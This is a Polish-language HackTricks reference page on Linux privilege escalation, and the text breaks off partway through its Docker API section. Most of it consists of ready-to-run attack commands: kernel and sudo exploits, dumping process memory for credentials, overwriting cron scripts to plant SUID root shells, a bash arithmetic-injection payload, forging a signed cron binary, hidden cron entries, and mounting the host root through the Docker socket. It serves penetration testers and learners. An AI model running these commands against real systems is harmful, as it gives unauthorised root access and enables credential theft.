# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacje o systemie

### Informacje o systemie operacyjnym

Zacznijmy od zdobycia informacji o działającym systemie.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Ścieżka

Jeśli **masz uprawnienia do zapisu w którymkolwiek folderze znajdującym się w zmiennej `PATH`** możesz być w stanie przejąć niektóre biblioteki lub binaria:
```bash
echo $PATH
```
### Informacje o środowisku

Czy w zmiennych środowiskowych znajdują się interesujące informacje, hasła lub klucze API?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Sprawdź wersję jądra i czy istnieje jakiś exploit, który można użyć do escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Możesz znaleźć dobrą listę podatnych wersji kernela i kilka już **compiled exploits** tutaj: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Inne serwisy, gdzie możesz znaleźć niektóre **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Aby wyodrębnić wszystkie podatne wersje kernela z tej strony możesz zrobić:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Narzędzia, które mogą pomóc w wyszukiwaniu exploitów jądra to:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (uruchomić na ofierze; sprawdza tylko exploity dla kernela 2.x)

Zawsze **wyszukaj wersję kernela w Google**, być może twoja wersja kernela jest wymieniona w jakimś kernel exploicie i wtedy będziesz mieć pewność, że exploit jest prawidłowy.

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Eskalacja uprawnień w Linuxie - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Wersja Sudo

Na podstawie podatnych wersji sudo, które pojawiają się w:
```bash
searchsploit sudo
```
Możesz sprawdzić, czy wersja sudo jest podatna, używając tego polecenia grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Wersje sudo wcześniejsze niż 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) pozwalają nieuprzywilejowanym użytkownikom lokalnym na eskalację uprawnień do root za pomocą opcji sudo `--chroot`, gdy plik `/etc/nsswitch.conf` jest używany z katalogu kontrolowanego przez użytkownika.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Przed uruchomieniem exploita upewnij się, że Twoja wersja `sudo` jest podatna i że obsługuje funkcję `chroot`.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: weryfikacja sygnatury nie powiodła się

Sprawdź **smasher2 box of HTB** jako **przykład** tego, jak ta vuln mogłaby zostać wykorzystana.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Więcej enumeracji systemu
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Wymień możliwe zabezpieczenia

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Jeśli znajdujesz się wewnątrz kontenera docker, możesz spróbować się z niego wydostać:


{{#ref}}
docker-security/
{{#endref}}

## Dyski

Sprawdź **co jest zamontowane i odmontowane**, gdzie i dlaczego. Jeśli coś jest odmontowane, możesz spróbować to zamontować i sprawdzić, czy nie zawiera prywatnych informacji
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Przydatne oprogramowanie

Wymień przydatne binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Sprawdź też, czy **jakiś kompilator jest zainstalowany**. Jest to przydatne, jeśli potrzebujesz użyć jakiegoś kernel exploit, ponieważ zaleca się skompilować go na maszynie, na której zamierzasz go użyć (lub na podobnej).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zainstalowane podatne oprogramowanie

Sprawdź **wersję zainstalowanych pakietów i usług**. Być może zainstalowana jest stara wersja Nagios (na przykład), która mogłaby zostać wykorzystana do escalating privileges…\
Zaleca się ręczne sprawdzenie wersji najbardziej podejrzanych zainstalowanych programów.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Jeśli masz dostęp przez SSH do maszyny możesz także użyć **openVAS** do sprawdzenia, czy na maszynie zainstalowane jest przestarzałe lub podatne oprogramowanie.

> [!NOTE] > _Zwróć uwagę, że te polecenia wyświetlą dużo informacji, które w większości będą bezużyteczne, dlatego zaleca się korzystanie z aplikacji takich jak OpenVAS lub podobnych, które sprawdzą, czy zainstalowane wersje oprogramowania są podatne na znane exploity_

## Procesy

Spójrz, **jakie procesy** są uruchomione i sprawdź, czy któryś proces nie ma **więcej uprawnień niż powinien** (może tomcat uruchomiony przez root?).
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** wykrywa je, sprawdzając parametr `--inspect` w linii poleceń procesu.\
Sprawdź też **uprawnienia do binariów procesów**, być może uda Ci się nadpisać któreś.

### Monitorowanie procesów

Możesz użyć narzędzi takich jak [**pspy**](https://github.com/DominicBreuker/pspy) do monitorowania procesów. Może to być bardzo przydatne do identyfikacji podatnych procesów uruchamianych często lub gdy spełniony jest określony zestaw warunków.

### Pamięć procesu

Niektóre usługi serwera zapisują **dane uwierzytelniające w postaci jawnego tekstu w pamięci**.\
Zazwyczaj będziesz potrzebować **uprawnień root** aby odczytać pamięć procesów należących do innych użytkowników, dlatego jest to zazwyczaj bardziej przydatne, gdy jesteś już rootem i chcesz znaleźć dodatkowe dane uwierzytelniające.\
Pamiętaj jednak, że **jako zwykły użytkownik możesz odczytać pamięć procesów, których jesteś właścicielem**.

> [!WARNING]
> Zwróć uwagę, że obecnie większość maszyn **domyślnie nie zezwala na ptrace**, co oznacza, że nie możesz dumpować procesów należących do innych użytkowników, gdy jesteś użytkownikiem bez uprawnień.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: wszystkie procesy mogą być debugowane, pod warunkiem że mają ten sam uid. To klasyczny sposób działania ptrace.
> - **kernel.yama.ptrace_scope = 1**: debugowany może być tylko proces rodzica.
> - **kernel.yama.ptrace_scope = 2**: tylko administrator może używać ptrace, ponieważ wymagana jest capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: żadne procesy nie mogą być śledzone za pomocą ptrace. Po ustawieniu tej wartości wymagany jest reboot, aby ponownie zezwolić na ptrace.

#### GDB

Jeśli masz dostęp do pamięci usługi FTP (na przykład), możesz wydobyć Heap i przeszukać w niej dane uwierzytelniające.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skrypt GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Dla danego process ID, **maps pokazują, jak pamięć jest zmapowana w** przestrzeni adresowej tego procesu; pokazują też **uprawnienia każdego zmapowanego regionu**. Plik **mem** (pseudoplik) **ujawnia samą pamięć procesu**. Z pliku **maps** wiemy, które **regiony pamięci są czytelne** oraz ich offsety. Używamy tych informacji, aby **przejść do pliku mem i zrzucić wszystkie czytelne regiony** do pliku.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` zapewnia dostęp do systemowej pamięci **fizycznej**, a nie pamięci wirtualnej. Wirtualna przestrzeń adresowa jądra może być dostępna za pomocą /dev/kmem.\
Zazwyczaj `/dev/mem` jest czytelny tylko dla **root** i grupy **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump dla Linux

ProcDump to reinterpretacja klasycznego narzędzia ProcDump z pakietu Sysinternals dla Windows, dostosowana do Linux. Pobierz ją z [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Narzędzia

Aby zrzucić pamięć procesu możesz użyć:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Możesz ręcznie usunąć wymagania root i zrzucić proces należący do ciebie
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root jest wymagany)

### Dane uwierzytelniające z pamięci procesu

#### Ręczny przykład

Jeśli znajdziesz, że proces authenticator jest uruchomiony:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Możesz dump the process (zobacz wcześniejsze sekcje, aby znaleźć różne sposoby na dump the memory of a process) i wyszukać credentials w pamięci:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Narzędzie [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) będzie **kraść poświadczenia w postaci jawnego tekstu z pamięci** oraz z niektórych **dobrze znanych plików**. Wymaga uprawnień root, aby działać poprawnie.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Wyszukiwanie Regexów/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Planowane zadania/Cron jobs

### Crontab UI (alseambusher) działający jako root – webowy scheduler privesc

Jeśli panel „Crontab UI” (alseambusher/crontab-ui) działa jako root i jest związany tylko z loopback, nadal możesz się do niego dostać przez SSH local port-forwarding i utworzyć uprzywilejowane zadanie do eskalacji.

Typowy przebieg
- Odnajdź port dostępny tylko na loopbacku (np. 127.0.0.1:8000) i realm Basic-Auth za pomocą `ss -ntlp` / `curl -v localhost:8000`
- Znajdź poświadczenia w artefaktach operacyjnych:
- Kopie zapasowe/skrypty z `zip -P <password>`
- unit systemd ujawniający `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tuneluj i zaloguj się:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Utwórz zadanie o wysokich uprawnieniach i uruchom je natychmiast (tworzy SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Użyj tego:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Nie uruchamiaj Crontab UI jako root; przypisz dedykowanego usera i minimalne uprawnienia
- Bind to localhost i dodatkowo ogranicz dostęp przez firewall/VPN; nie używaj ponownie haseł
- Unikaj osadzania sekretów w unit files; użyj secret stores lub root-only EnvironmentFile
- Włącz audit/logging dla wykonywania zadań na żądanie

Sprawdź, czy jakieś zaplanowane zadanie jest podatne. Być może możesz wykorzystać skrypt wykonywany przez root (wildcard vuln? można modyfikować pliki, których root używa? użyć symlinks? utworzyć konkretne pliki w katalogu, którego root używa?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Ścieżka Cron

Na przykład, w _/etc/crontab_ możesz znaleźć PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zauważ, że użytkownik "user" ma prawa zapisu do /home/user_)

Jeśli w tym crontabie użytkownik root próbuje wykonać jakąś komendę lub skrypt bez ustawienia ścieżki. Na przykład: _\* \* \* \* root overwrite.sh_\
Wtedy możesz uzyskać powłokę roota używając:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron uruchamiający skrypt z wildcard (Wildcard Injection)

Jeśli skrypt uruchamiany przez root zawiera “**\***” w poleceniu, możesz to wykorzystać, aby spowodować nieoczekiwane działania (np. privesc). Przykład:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Jeśli wildcard jest poprzedzony ścieżką taką jak** _**/some/path/\***_ **, to nie jest podatny (nawet** _**./\***_ **nie jest).**

Przeczytaj następującą stronę, aby poznać więcej trików dotyczących exploitacji wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash — wstrzyknięcie arithmetic expansion w parserach logów cron

Bash wykonuje parameter expansion i command substitution przed arithmetic evaluation w ((...)), $((...)) i let. Jeśli root cron/parser odczytuje nieufne pola logu i przekazuje je do kontekstu arytmetycznego, atakujący może wstrzyknąć command substitution $(...), które wykona się jako root, gdy cron się uruchomi.

- Dlaczego to działa: W Bash rozwinięcia zachodzą w tej kolejności: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. Zatem wartość taka jak `$(/bin/bash -c 'id > /tmp/pwn')0` zostanie najpierw zastąpiona (uruchamiając komendę), a pozostała liczbowa `0` zostanie użyta do arytmetycznego przeliczenia, więc skrypt kontynuuje bez błędów.

- Typowy wzorzec podatności:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Eksploatacja: Spraw, żeby tekst kontrolowany przez atakującego został zapisany do parsowanego logu, tak aby pole wyglądające na liczbowe zawierało command substitution i kończyło się cyfrą. Upewnij się, że twoja komenda nie wypisuje na stdout (lub przekieruj jej wyjście), żeby arytmetyka pozostała poprawna.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Nadpisywanie skryptu cron i symlink
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Jeśli script uruchamiany przez root używa **directory, do którego masz pełny dostęp**, może być użyteczne usunięcie tego folderu i **utworzenie symlink folderu wskazującego na inny**, który będzie serwował script kontrolowany przez Ciebie
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Niestandardowo podpisane binarki cron z zapisywalnymi payloadami
Blue teams czasami „podpisują” binarki uruchamiane przez cron, zrzucając niestandardową sekcję ELF i używając grep, żeby znaleźć vendor string przed uruchomieniem ich jako root. Jeśli ta binarka jest zapisywalna przez grupę (np. `/opt/AV/periodic-checks/monitor` należący do `root:devs 770`) i możesz leak the signing material, możesz sfabrykować sekcję i przejąć zadanie cron:

1. Użyj `pspy`, aby przechwycić przepływ weryfikacji. W Era root uruchomił `objcopy --dump-section .text_sig=text_sig_section.bin monitor` a następnie `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` i potem wykonał plik.
2. Odtwórz oczekiwany certyfikat używając leaked key/config (z `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Zbuduj złośliwy zamiennik (np. umieść SUID bash, dodaj swój klucz SSH) i osadź certyfikat w `.text_sig`, żeby grep przeszedł:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Nadpisz zaplanowany binarny plik, zachowując bity wykonania:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Poczekaj na następne uruchomienie cron; gdy naiwne sprawdzenie podpisu się powiedzie, twój payload uruchomi się jako root.

### Częste zadania cron

Możesz monitorować procesy, aby znaleźć te uruchamiane co 1, 2 lub 5 minut. Być może możesz to wykorzystać i escalate privileges.

Na przykład, aby **monitorować co 0.1s przez 1 minutę**, **posortować według rzadziej wykonywanych poleceń** i usunąć polecenia, które były wykonywane najczęściej, możesz zrobić:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Możesz też użyć** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (to będzie monitorować i wyświetlać każdy proces, który się uruchamia).

### Niewidoczne cron jobs

Można utworzyć cronjob **dodając znak powrotu karetki po komentarzu** (bez znaku nowej linii), i cron job będzie działać. Przykład (zwróć uwagę na znak powrotu karetki):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Usługi

### Zapisowalne _.service_ pliki

Sprawdź, czy możesz zapisać dowolny `.service` file, jeśli tak, możesz go **zmodyfikować**, aby **uruchamiał** Twój **backdoor, gdy** usługa jest **uruchamiana**, **restartowana** lub **zatrzymywana** (być może będziesz musiał poczekać, aż maszyna zostanie zrestartowana).\
Na przykład umieść swój backdoor w pliku .service za pomocą **`ExecStart=/tmp/script.sh`**

### Zapisywalne pliki binarne usług

Pamiętaj, że jeśli masz **uprawnienia zapisu do binariów wykonywanych przez usługi**, możesz je zmienić na backdoors, tak że po ponownym uruchomieniu usług backdoors zostaną uruchomione.

### systemd PATH - Ścieżki względne

Możesz zobaczyć PATH używany przez **systemd** za pomocą:
```bash
systemctl show-environment
```
Jeśli odkryjesz, że możesz **zapisywać** w którymkolwiek z folderów na ścieżce, możesz być w stanie **escalate privileges**. Musisz szukać **używania ścieżek względnych w plikach konfiguracji usług** takich jak:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Następnie utwórz **wykonywalny plik** o **tej samej nazwie co plik binarny wskazywany przez względną ścieżkę** wewnątrz folderu PATH systemd, do którego masz uprawnienia zapisu, a gdy usługa zostanie poproszona o wykonanie podatnej akcji (**Start**, **Stop**, **Reload**), Twój **backdoor zostanie uruchomiony** (nieuprzywilejowani użytkownicy zwykle nie mogą startować/stopować usług, ale sprawdź czy możesz użyć `sudo -l`).

**Dowiedz się więcej o usługach za pomocą `man systemd.service`.**

## **Timers**

**Timers** to pliki jednostek systemd, których nazwa kończy się na `**.timer**`, które kontrolują pliki `**.service**` lub zdarzenia. **Timers** mogą być używane jako alternatywa dla cron, ponieważ mają wbudowane wsparcie dla zdarzeń czasu kalendarzowego i zdarzeń czasu monotonicznego oraz mogą być uruchamiane asynchronicznie.

Możesz wyświetlić wszystkie Timers za pomocą:
```bash
systemctl list-timers --all
```
### Zapisywalne timery

Jeśli możesz zmodyfikować timer, możesz spowodować uruchomienie pewnych jednostek systemd.unit (np. `.service` lub `.target`)
```bash
Unit=backdoor.service
```
W dokumentacji możesz przeczytać, czym jest Unit:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Dlatego, aby nadużyć tego uprawnienia, musiałbyś:

- Znaleźć jakąś jednostkę systemd (np. `.service`), która **uruchamia zapisywalny plik binarny**
- Znaleźć jednostkę systemd, która **uruchamia względną ścieżkę** i nad którą masz **uprawnienia zapisu** w **systemd PATH** (aby podszyć się pod ten plik wykonywalny)

**Dowiedz się więcej o timerach za pomocą `man systemd.timer`.**

### **Włączanie timera**

Aby włączyć timer, potrzebujesz uprawnień roota i wykonać:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Zauważ, że **timer** jest **aktywowany** przez utworzenie symlinku do niego w `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Gniazda

Unix Domain Sockets (UDS) umożliwiają **komunikację między procesami** na tych samych lub różnych maszynach w modelach klient-serwer. Wykorzystują standardowe pliki deskryptorów Uniksa do komunikacji między komputerami i są konfigurowane za pomocą plików `.socket`.

Gniazda można konfigurować za pomocą plików `.socket`.

**Dowiedz się więcej o sockets za pomocą `man systemd.socket`.** W tym pliku można skonfigurować kilka interesujących parametrów:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Te opcje różnią się między sobą, ale w skrócie służą do **wskazania, gdzie będzie nasłuchiwać** gniazdo (ścieżka pliku gniazda AF_UNIX, adres IPv4/6 i/lub numer portu do nasłuchiwania itp.)
- `Accept`: Przyjmuje argument typu boolean. Jeśli **true**, dla każdego przychodzącego połączenia **tworzona jest instancja usługi** i do niej przekazywane jest tylko gniazdo połączenia. Jeśli **false**, wszystkie nasłuchujące gniazda są **przekazywane do uruchomionej jednostki service**, a tylko jedna jednostka service jest tworzona dla wszystkich połączeń. Ta wartość jest ignorowana dla gniazd datagramowych i FIFO, gdzie jedna jednostka service bezwarunkowo obsługuje cały przychodzący ruch. **Domyślnie false**. Ze względów wydajnościowych zaleca się implementować nowe demony tak, aby były zgodne z `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Przyjmują jedną lub więcej linii poleceń, które są **wykonywane przed** lub **po** utworzeniu i powiązaniu nasłuchujących **gniazd**/FIFO, odpowiednio. Pierwszym tokenem linii poleceń musi być absolutna nazwa pliku, następnie argumenty dla procesu.
- `ExecStopPre`, `ExecStopPost`: Dodatkowe **polecenia**, które są **wykonywane przed** lub **po** zamknięciu i usunięciu nasłuchujących **gniazd**/FIFO, odpowiednio.
- `Service`: Określa nazwę jednostki **service**, którą należy **aktywować** przy **przychodzącym ruchu**. To ustawienie jest dozwolone tylko dla gniazd z Accept=no. Domyślnie wskazuje na service o tej samej nazwie co socket (z zastąpionym sufiksem). W większości przypadków użycie tej opcji nie powinno być konieczne.

### Zapisywalne pliki .socket

Jeśli znajdziesz **zapisywalny** plik `.socket`, możesz **dodać** na początku sekcji `[Socket]` coś takiego: `ExecStartPre=/home/kali/sys/backdoor` i backdoor zostanie wykonany przed utworzeniem gniazda. W związku z tym **prawdopodobnie będziesz musiał poczekać na restart maszyny.**\
_Należy zauważyć, że system musi używać tej konfiguracji pliku socket, w przeciwnym razie backdoor nie zostanie wykonany_

### Zapisywalne gniazda

Jeśli **zidentyfikujesz jakiekolwiek gniazdo z prawem zapisu** (_teraz mówimy o Unix Sockets, a nie o plikach konfiguracyjnych `.socket`_), to **możesz się komunikować** z tym gniazdem i być może wykorzystać podatność.

### Enumeracja Unix Domain Sockets
```bash
netstat -a -p --unix
```
### Surowe połączenie
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Przykład eksploatacji:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Zwróć uwagę, że mogą istnieć pewne **sockets listening for HTTP** requests (_Nie mam na myśli .socket files, lecz plików działających jako unix sockets_). Możesz to sprawdzić za pomocą:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Jeśli socket **odpowiada na żądanie HTTP**, możesz z nim **komunikować się** i być może **wykorzystać jakąś podatność**.

### Zapisowalny Docker socket

Socket Docker, często znajdujący się pod `/var/run/docker.sock`, to krytyczny plik, który należy zabezpieczyć. Domyślnie jest zapisywalny przez użytkownika `root` i członków grupy `docker`. Posiadanie uprawnień do zapisu do tego socketu może prowadzić do privilege escalation. Poniżej znajduje się opis, jak można to zrobić oraz alternatywne metody, jeśli Docker CLI nie jest dostępne.

#### **Privilege Escalation with Docker CLI**

Jeśli masz uprawnienia zapisu do Docker socket, możesz przeprowadzić privilege escalation, używając następujących poleceń:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Te polecenia umożliwiają uruchomienie kontenera z uprawnieniami roota do systemu plików hosta.

#### **Korzystanie bezpośrednio z Docker API**

W sytuacjach, gdy Docker CLI nie jest dostępny, Docker socket można nadal manipulować przy użyciu Docker API i poleceń `curl`.

1.  **List Docker Images:** Pobierz listę dostępnych obrazów.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Wyślij żądanie utworzenia kontenera, który zamontuje katalog główny systemu hosta.

